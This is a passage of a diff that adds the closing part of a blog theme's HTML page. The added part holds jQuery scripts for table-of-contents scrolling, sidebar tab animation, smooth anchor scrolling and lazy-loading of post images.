+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
